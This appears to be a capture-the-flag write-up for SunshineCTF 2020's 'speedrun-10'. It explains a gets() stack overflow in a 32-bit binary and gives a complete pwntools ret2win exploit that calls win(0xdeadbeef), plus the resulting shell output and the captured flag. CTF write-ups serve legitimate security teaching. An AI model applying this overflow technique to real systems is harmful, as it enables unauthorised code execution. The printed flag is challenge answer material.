# **speedrun-10**
## Task
nc chal.2020.sunshinectf.org 30010
File: chall_10
Tag: binary exploitation 

## Solution

### Checksec
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
* No Canary assume BOF
* No PIE assume ROP
* System 32 bit
### Decompile with ghidra
```c
void vuln(void)

{
  char local_3e [54];
  
  __x86.get_pc_thunk.ax();
  gets(local_3e);
  return;
}

void win(int param_1)

{
  int iVar1;
  
  iVar1 = __x86.get_pc_thunk.ax();
  if (param_1 == -0x21524111) {
    system((char *)(iVar1 + 0x12e));
  }
  return;
}
```
This challanges just like [speedrun--02](), but the difference is that we need to setup a stack frame as if we call `win`. 

For `x86(32 bit)` passing the parameter through stack. However, the next parameter on the stack needs to be the return address of the function `win` will return to. But our destination is leaking the flag so just set the return address anything -> `p32(0)` .The last value (the next on the stack) we write out the parameter with `0xdeadbeef = -0x21524111` -> `win(0xdeadbeef)`

### Exploit
```python
from pwn import *

binary = context.binary = ELF('./chall_10')
payload = b'a'*0x3e
payload += p32(binary.sym.win)
payload += p32(0)
payload += p32(0xdeadbeef)
p = remote('chal.2020.sunshinectf.org',30010)
p.sendlineafter('Don\'t waste your time, or...\n','foobar')
p.sendline(payload)
p.interactive()
```

### Output
```bash
[*] '/home/kali/speedrun_sunshineCTF2020/chall_10'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to chal.2020.sunshinectf.org on port 30010: Done
[*] Switching to interactive mode
$ ls
chall_10
flag.txt
$ cat flag.txt
sun{second-heartbeat-aeaff82332769d0f}
```
